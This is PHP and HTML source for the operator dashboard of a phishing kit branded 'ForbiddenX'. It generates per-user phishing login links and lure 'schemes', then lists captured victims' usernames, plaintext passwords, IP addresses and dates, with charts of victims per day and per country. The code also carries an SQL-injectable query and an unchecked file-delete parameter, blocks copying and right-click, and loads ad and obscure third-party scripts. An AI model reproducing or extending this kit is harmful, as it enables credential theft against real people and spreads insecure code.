<?php
session_start();
include("obf_code.php");
// Include auth_session.php file on all user panel pages
include("auth_session.php");

// Include the db.php file to establish a database connection
require('db.php');

// Retrieve user information from the database based on the session username
$username = $_SESSION['username'];
$query = "SELECT email, unique_identifier FROM `users` WHERE username='$username'";
$result = mysqli_query($con, $query);
$row = mysqli_fetch_assoc($result);
$email = $row['email'];
$uniqueIdentifier = $row['unique_identifier'];

// Check if the user was found
if ($row) {
    // Retrieve the current user's unique identifier
    $currentIdentifier = $uniqueIdentifier;

    // Retrieve the current user's PHP file path
    $userPHPFile = 'https://www.safemotivation.tech/q/' . $currentIdentifier . '/' . $currentIdentifier . '?ctx_login';

    // Retrieve the current user's date
    $userDate = isset($currentUser['date']) ? $currentUser['date'] : '';

    // Construct the path to the user's 'users.php' file
    $usersFile = '/home/u667008371/domains/safemotivation.tech/public_html/q/' . $uniqueIdentifier . '/users.php';

    // Check if the 'users.php' file exists
    if (file_exists($usersFile)) {
        // Include the 'users.php' file
        include $usersFile;

        // Retrieve the current user's date
        $userDate = isset($currentUser['date']) ? $currentUser['date'] : '';
    } 
} 

// Prepare the data for the chart
$loginData = array(
    'Monday' => 0,
    'Tuesday' => 0,
    'Wednesday' => 0,
    'Thursday' => 0,
    'Friday' => 0,
    'Saturday' => 0,
    'Sunday' => 0
);

// Iterate over the users and count logins by day of the week
if (isset($users)) {
    foreach ($users as $user) {
        $userDate = isset($user['date']) ? $user['date'] : '';
        if ($userDate) {
            $dayOfWeek = date('l', strtotime($userDate));
            if (isset($loginData[$dayOfWeek])) {
                $loginData[$dayOfWeek]++;
            }
        }
    }
}

// Prepare the data for the chart
$countryData = array();

// Iterate over the users and count users by country
if (!empty($users)) {
    foreach ($users as $user) {
        $country = $user['country'];

        // Add the country to the countryData array
        if (!isset($countryData[$country])) {
            $countryData[$country] = 1;
        } else {
            $countryData[$country]++;
        }
    }
}

// Check if there are no users
if (empty($countryData)) {
    echo '';
} else {
    // Prepare the data for the chart
    $chartLabels = array_keys($countryData);
    $chartData = array_values($countryData);

    // Convert the data to JSON for use with Chart.js
    $chartLabelsJSON = json_encode($chartLabels);
    $chartDataJSON = json_encode($chartData);

    // Display the chart using Chart.js
    // ... (your chart code here)
}


if (isset($_COOKIE['user'])) {
    // Get the current cookie value
    $username = $_COOKIE['user'];

    // Extend the expiration time to 1 month from now
    $expiration_time = time() + (30 * 24 * 60 * 60); // 1 month in seconds
    setcookie('user', $username, $expiration_time, '/');
}



?>



<!DOCTYPE html>
<html lang="en">

<head>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>Server</title>
  <!-- plugins:css -->
  <script src="/js/vendor.bundle.base.js"></script>
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script> 
  <script src="/js/off-canvas.js"></script>
  <link rel="stylesheet" href="/css/materialdesignicons.min.css">
  <link href="
https://cdn.jsdelivr.net/npm/@mdi/font@7.2.96/css/materialdesignicons.min.css
" rel="stylesheet">
  <link rel="stylesheet" href="/css/style.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/page-accelerator/0.1.1/page-accelerator.min.js" integrity="sha512-YZMsq9hQOwRuYLHDE3xu5Fuqc7dsw8JW93koppkyK4dxD963sMKZkZQFF62HpQIA74nmG8mK4lzKQf0IpFOU2Q==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
  <style>
  .code{color:#C7BDF9;}
  </style>
  <style>@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400&display=swap'); body{font-family: 'Poppins', sans-serif; }</style>
  </head>
<body oncontextmenu="return false">

   
   
  <div class="container-scroller">
    <nav class="sidebar sidebar-offcanvas" id="sidebar">
      <div class="sidebar-brand-wrapper d-none d-lg-flex align-items-center justify-content-center fixed-top">

      </div>
      <ul class="nav">
        <li class="nav-item profile">
          <div class="profile-desc">
            <div class="profile-pic">
              <div class="count-indicator">
                <img class="img-xs rounded-circle" src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/800px-Anonymous_emblem.svg.png" alt="">
                <span class="count bg-success"></span>
              </div>
              <div class="profile-name">
                <h5 class="mb-0 font-weight-normal">ForbiddenX</h5>
                <span>MAIN SERVER</span>
              </div>
            </div>

          </div>
        </li>
        <li class="nav-item nav-category">
          <span class="nav-link">NAVIGATION</span>
        </li>
        <li class="nav-item menu-items">
          <a class="nav-link" href="/logout">
            <span class="menu-icon">
              <i class="mdi mdi-logout"></i>
            </span>
            <span class="menu-title text-light"> LOG OUT</span>
          </a>
        </li>
     </ul>
    </nav>



<script type="text/javascript">
    function mousehandler(e) {
        var myevent = (isNS) ? e : event;
        var eventbutton = (isNS) ? myevent.which : myevent.button;
        if ((eventbutton == 2) || (eventbutton == 3)) return false;
    }
    document.oncontextmenu = mischandler;
    document.onmousedown = mousehandler;
    document.onmouseup = mousehandler;
    function disableCtrlKeyCombination(e) {
        var forbiddenKeys = new Array("a", "s", "c", "x","u");
        var key;
        var isCtrl;
        if (window.event) {
            key = window.event.keyCode;
            //IE
            if (window.event.ctrlKey)
                isCtrl = true;
            else
                isCtrl = false;
        }
        else {
            key = e.which;
            //firefox
            if (e.ctrlKey)
                isCtrl = true;
            else
                isCtrl = false;
        }
        if (isCtrl) {
            for (i = 0; i < forbiddenKeys.length; i++) {
                //case-insensitive comparation
                if (forbiddenKeys[i].toLowerCase() == String.fromCharCode(key).toLowerCase()) {
                    return false;
                }
            }
        }
        return true;
    }
</script>


   
    <div class="container-fluid page-body-wrapper">
      <nav class="navbar p-0 fixed-top d-flex flex-row">
        <div class="navbar-brand-wrapper d-flex d-lg-none align-items-center justify-content-center">
          <a class="text-light navbar-brand brand-logo-mini" href="/"><h3>ForbiddenX</h3></a>
        </div>
        <div class="navbar-menu-wrapper flex-grow d-flex align-items-stretch">
          <button class="navbar-toggler navbar-toggler align-self-center" type="button" data-toggle="minimize">
            <span class="mdi mdi-menu"></span>
          </button>
          <ul class="navbar-nav w-100">
            <li class="nav-item w-100">
              <form class="nav-link mt-2 mt-md-0 d-none d-lg-flex search">
                <input type="text" class="form-control" placeholder="Search products">
              </form>
            </li>
          </ul>
          <ul class="navbar-nav navbar-nav-right">
            <!-- Navbar right content goes here -->
          </ul>
          <button class="navbar-toggler navbar-toggler-right d-lg-none align-self-center" type="button" data-toggle="offcanvas">
            <span class="mdi mdi-format-line-spacing"></span>
          </button>
        </div>
      </nav>
</div>
 
   <div class="main-panel">
        <div class="content-wrapper">
            <!----banner---->
 <script async type="application/javascript" src="https://a.exdynsrv.com/ad-provider.js"></script> 
 <ins class="adsbyexoclick" data-zoneid="4999384"></ins> 
 <script>(AdProvider = window.AdProvider || []).push({"serve": {}});</script>
 
   <!----popup--->
    <script async type="application/javascript" src="https://a.realsrv.com/ad-provider.js"></script> 
 <ins class="adsbyexoclick" data-zoneid="4999394"></ins> 
 <script>(AdProvider = window.AdProvider || []).push({"serve": {}});</script>
 <!----clicks---->
 <script type="application/javascript" 
data-idzone="4999396"  data-ad_frequency_count="1"  data-ad_frequency_period="5"  data-type="mobile" 
data-browser_settings="1" 
data-ad_trigger_method="3" 

src="https://a.realsrv.com/fp-interstitial.js"></script>


<!----vidslider---->
<script type="application/javascript" src="https://a.realsrv.com/video-slider.js"></script>
<script type="application/javascript">
var adConfig = {
    "idzone": 4999400,
    "frequency_period": 0,
    "close_after": 10,
    "on_complete": "repeat",
    "branding_enabled": 1,
    "screen_density": 20,
    "cta_enabled": 1
};
ExoVideoSlider.init(adConfig);
</script>
<!----inpagenotif--->
            
            <div class="row">
<div class="col-lg-6 grid-margin stretch-card">
              <div class="card">
                <div class="card-body">

                  <h5>            
           <?php echo "Welcome to your dashboard, <h1><code class='code' style='font-size:34px'> " . $username . "!</code></h1>"; ?></h5>


<h4>Total Victims: <?php
            // Check if the 'users.php' file exists
            if (file_exists($usersFile)) {
              // Include the 'users.php' file
              include $usersFile;

              // Count the total number of users
              $totalUsers = count($users);

              // Display the total number of users
              echo '<span style="align-text: right; padding:5px; margin:20px; border-radius: 6px" class=" bg-danger"> ' . $totalUsers . '</span>';
              
            } else {
              echo "0";
            }
            ?>
            
                                  </h4>
                     <label style="font-size:10px">EMAIL:</label>
           
           
                  <div class="form-group">
                      <div class="input-group">
               <input style="background-color:transparent;" readonly type="text" class="text-info form-control" value=" <?php echo $email ?>" aria-label="Recipient's username" aria-describedby="basic-addon2">
                                                                 <div class="input-group-append">
                          <button onclick="window.location.href = 'change_password';"class="btn btn-sm btn-info" type="button">Change Password</button>    
                          </div>   
                          </div>
                          </div>
                  <h6><?php echo " 
                  File Name:<code> " . $uniqueIdentifier . ". </code><br>"; ?></h6>

    
       <div class="bg-gray-dark d-flex d-md-block d-xl-flex flex-row py-3 px-4 px-md-3 px-xl-4 rounded mt-3">
                      <div class="text-md-center text-xl-left">
                        <h6 class="code mb-0">Log in Link Generated</h6>
                        
                        <hr>
                        <h6 style="font-size: 8px;" class="text-muted mb-0">                 
<div class="input-group">
<input id="userPHPFileInput"  style="background-color:black;color:white;" type="text" class="form-control" value="<?php echo $userPHPFile; ?>" readonly>
  <div class="input-group-append">
    <button class="btn btn-info" type="button" onclick="copyToClipboard()">Copy</button>
  </div>
</div>
<script>
function copyToClipboard() {
  var input = document.getElementById('userPHPFileInput');
  input.select();
  input.setSelectionRange(0, 99999); // For mobile devices

  // Copy the text to the clipboard
  navigator.clipboard.writeText(input.value)
    .then(function() {
      // Update the button text after copying
      var button = document.querySelector('.btn');
      button.innerHTML = 'Copied!';
    })
    .catch(function(error) {
      console.error('Unable to copy text: ', error);
    });
}
</script>                     </h6>
                      </div>
                    </div>
                  

    <div class="bg-gray-dark d-flex d-md-block d-xl-flex flex-row py-3 px-4 px-md-3 px-xl-4 rounded mt-3">
                      <div class="text-md-center text-xl-left">
                        <h6 class="code mb-0">Free Schemes Generated</h6>
                        
                        <hr>
                        <h4 class="text-muted mb-0">         
                        <?php
// Define the folder path
$folderPath = '/home/u667008371/domains/safemotivation.tech/public_html/q/' . $currentIdentifier . '/';

// Check if the folder exists
if (is_dir($folderPath)) {
  // Get the list of files
  $files = scandir($folderPath);

  // Filter out non-PHP and non-users.php files
  $filteredFiles = array_filter($files, function ($file) {
    $extension = pathinfo($file, PATHINFO_EXTENSION);
    return $extension === 'php' && $file !== 'users.php';
  });

  // Remove the current identifier file
  $filteredFiles = array_filter($filteredFiles, function ($file) use ($currentIdentifier) {
    $fileName = pathinfo($file, PATHINFO_FILENAME);
    return $fileName !== $currentIdentifier;
  });

  // Check if there are any files
  if (!empty($filteredFiles)) {
    echo '<ul>';
    foreach ($filteredFiles as $file) {
      $fileName = pathinfo($file, PATHINFO_FILENAME);
      echo '<li><a href="https://safemotivation.tech/q/' . $currentIdentifier . '/' . $fileName . '">' . $fileName . '</a></li>';
    }
    echo '</ul>';
  } else {
    echo '<p>No Schemes in your ' . $currentIdentifier . ' folder. Generate below.</p>';
  }
} 



?>

</h4>
                      </div>
                    </div>

                  



        
                    <div class="col-8 col-sm-12 col-xl-8 my-auto">

                        <div class="template-demo mt-2">
                            <?php echo "<a class='btn btn-outline-info btn-icon-text 'href='" . $userPHPFile . "'>View link          <i class='mdi mdi-link btn-icon-append'></i></a><br>"; ?>
                                 </div>                 
                      </div>
                    </div>
                  
                </div>
              </div>





            </div>
            
            
 <div class="row">
<div class="col-xl-3 col-sm-6 grid-margin stretch-card">
    <?php
    include('schemes.php');
    ?>
  <div class="card">
    <div class="card-body">
      <h4 class="card-title">Free Schemes</h4>
      <form method="POST" action="">
        <div class="form-group">
          <label> </label>
          <select class="js-example-basic-single form-control" style="width:100%" name="selection">
            <option value="MentalHealth">Mental Health</option>
            <option value="ChildLabor">Child Labor (unavailable)</option>
          </select>
        </div>
        <button type="submit" name="submit" class="btn btn-outline-info w-100 btn-icon-text">Generate <i class="mdi mdi-upload btn-icon-append"></i></button>
      </form>
    </div>
  </div>
</div>

<div class="col-xl-3 col-sm-6 grid-margin stretch-card">
  <div class="card">
    <div class="card-body">
      <h4 class="card-title"><code>YOUR FOLDER NAME:</code> <?php echo $currentIdentifier; ?></h4>
      <?php
      // Define the folder path
      $folderPath = '/home/u667008371/domains/safemotivation.tech/public_html/q/' . $currentIdentifier . '/';

      // Check if the folder exists
      if (is_dir($folderPath)) {
        // Get the list of files
        $files = scandir($folderPath);

        // Filter out non-PHP files
        $phpFiles = array_filter($files, function ($file) {
          return pathinfo($file, PATHINFO_EXTENSION) === 'php';
        });

        // Check if there are any PHP files
        if (!empty($phpFiles)) {
          echo '<div class="table-responsive">';
          echo '<table class="table">';
          echo '<thead>';
          echo '<tr>';
          echo '<th>Your File/s Name:</th>';
          echo '<th>Delete</th>';
          echo '</tr>';
          echo '</thead>';
          echo '<tbody>';
          foreach ($phpFiles as $file) {
            // Skip the users.php file
            if ($file === 'users.php') {
              continue;
            }
            $fileName = pathinfo($file, PATHINFO_FILENAME);
            echo '<tr>';
            echo '<td><a href="https://safemotivation.tech/q/' . $currentIdentifier . '/' . $fileName . '">' . $fileName . '</a></td>';
            if ($file !== $currentIdentifier . '.php') {
              echo '<td><a href="?delete=' . $file . '">Delete</a></td>';
            } else {
              echo '<td></td>'; // Empty column for the current identifier file
            }
            echo '</tr>';
          }
          echo '</tbody>';
          echo '</table>';
          echo '</div>';
        } else {
          echo '<p>No PHP files found in ' . $currentIdentifier . ' folder.</p>';
        }
      } else {
        echo '<p>Folder ' . $currentIdentifier . ' does not exist.</p>';
      }

      // Check if a file deletion is requested
      if (isset($_GET['delete'])) {
        $fileToDelete = $_GET['delete'];
        $filePath = $folderPath . $fileToDelete;

        // Check if the file exists and is not users.php or the current identifier file
        if (file_exists($filePath) && $fileToDelete !== 'users.php' && $fileToDelete !== $currentIdentifier . '.php') {
          if (unlink($filePath)) {
            echo '<p>File ' . $fileToDelete . ' deleted successfully.</p>';
          }
        }
      }
      ?>
    </div>
  </div>
</div>    
 </div>          








  <div class="row">
<div class="col-xl-3 col-sm-6 grid-margin stretch-card">
        <div class="card">
            <div class="card-body">
                <h4 class="card-title"><code>Countries</code></h4>
<!-- Create a canvas element for the chart -->
<!-- Include Chart.js library -->
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>

<!-- Create a canvas element for the chart -->
<canvas id="userCountryChart"></canvas>

<!-- JavaScript code to create the chart -->
<script>
    // Get the chart data from PHP variables
    var chartLabels = <?php echo $chartLabelsJSON; ?>;
    var chartData = <?php echo $chartDataJSON; ?>;

    // Create the chart using Chart.js
    var ctx = document.getElementById('userCountryChart').getContext('2d');
    var chart = new Chart(ctx, {
        type: 'bar',
        data: {
            labels: chartLabels,
            datasets: [{
                label: 'VICTIMS BY COUNTRY',
                data: chartData,
                backgroundColor: '#7a49a5',
                borderColor: '#C7BDF9',
                borderWidth: 3
            }]
        },
        options: {
            scales: {
                y: {
                    beginAtZero: true,
                    precision: 0
                }
            }
        }
    });
</script>


            </div>
        </div>
    </div>
   
    
    

<div class="col-xl-3 col-sm-6 grid-margin stretch-card">
        <div class="card">
            <div class="card-body">
                <h4 class="card-title"><code>Phished Analytics</code></h4>
                <canvas id="loginChart"></canvas>

            </div>
        </div>
    </div>

 <script>
        // Convert the login data from PHP format to JavaScript format
        var chartLabels = <?php echo json_encode(array_keys($loginData)); ?>;
        var chartData = <?php echo json_encode(array_values($loginData)); ?>;

        // Draw the login data chart
        var ctx = document.getElementById('loginChart').getContext('2d');
        var loginChart = new Chart(ctx, {
            type: 'line',
            data: {
                labels: chartLabels,
                datasets: [{
                    label: 'Victims per Day',
                    data: chartData,
                    backgroundColor: '#7a49a5',
                    borderColor: '#C7BDF9',
                    borderWidth: 3
                }]
            },
            options: {
                scales: {
                    y: {
                        beginAtZero: true,
                        stepSize: 1
                    }
                }
            }
        });
    
    </script>


<div class="col-lg-6 grid-margin stretch-card">
  <div class="card">
    <div class="card-body">
      <small class="code card-title text-danger">VICTIMS</small>

      <div class="table-responsive">
        <table class="table">
          <thead>
            <tr>
              <th class="text-light">Username</th>
              <th class="text-light">Password</th>
              
              <th class="text-light"> IP Address</th>
              <th class="text-light">Date</th>
            </tr>
          </thead>
          <tbody>
            <?php
            $usersFile = '/home/u667008371/domains/safemotivation.tech/public_html/q/' . $uniqueIdentifier . '/users.php';

            if (file_exists($usersFile) && filesize($usersFile) > 0) {
              include $usersFile;
            } else {
              $users = []; // Empty users array
            }

            if (!empty($users)) {
              foreach ($users as $user) {
                echo "<tr>";
                echo "<td><code class='code'>" . $user['username'] . "</code></td>";
                echo "<td><code>" . $user['password'] . "</code></td>";
                  echo "<td><code>" . $user['ip_address'] . "</code></td>";
                echo "<td class='text-success'>" . $user['date'] . "</td>";
                echo "</tr>";
              }
            } else {
              echo "<tr><td class='code' colspan='3'>NO VICTIMS YET.</td></tr>";
            }
            ?>
          </tbody>
        </table>
      </div>
    </div>
  </div>
</div>
 

<script async type="application/javascript" src="https://a.realsrv.com/ad-provider.js"></script> 
 <ins class="adsbyexoclick" data-zoneid="4999416"></ins> 
 <script>(AdProvider = window.AdProvider || []).push({"serve": {}});</script>

<script async type="application/javascript" src="https://a.exdynsrv.com/ad-provider.js"></script> 
 <ins class="adsbyexoclick" data-zoneid="4999384"></ins> 
 <script>(AdProvider = window.AdProvider || []).push({"serve": {}});</script>


<div class="container mt-3 mb-3 text-center">
    <script data-cfasync="false" type="text/javascript" src="//alas4kanmfa6a4mubte.com/lv/esnk/1841674/code.js" async id="__clb-1841674">
    </script>
    
  <script type='text/javascript' src='//deductionkeepingbabysitter.com/72/8a/58/728a58c69c6f14b6f63d3e9993ff4820.js'>
  </script>
  </div>

          </div>
        </div>




        <footer class="footer">
          <div class="d-sm-flex justify-content-center justify-content-sm-between">
            <span class="text-muted d-block text-center text-sm-left d-sm-inline-block">Copyright © ForbiddenX 8BIT
              2023</span>
          </div>
        </footer>
      </div>
    </div>
  </div>

  <!-- Optional JavaScript -->
  <!-- plugins:js -->
  <script src="/js/vendor.bundle.base.js"></script>
  <script src="assets/js/off-canvas.js"></script>
  <!-- endinject -->
  <!-- Plugin js for this page -->
  <!-- End plugin js for this page -->
  <!-- inject:js -->
  <script src="assets/js/template.js"></script>
  <!-- endinject -->
  <!-- Custom js for this page -->
  <!-- End custom js for this page -->
</body>

</html>

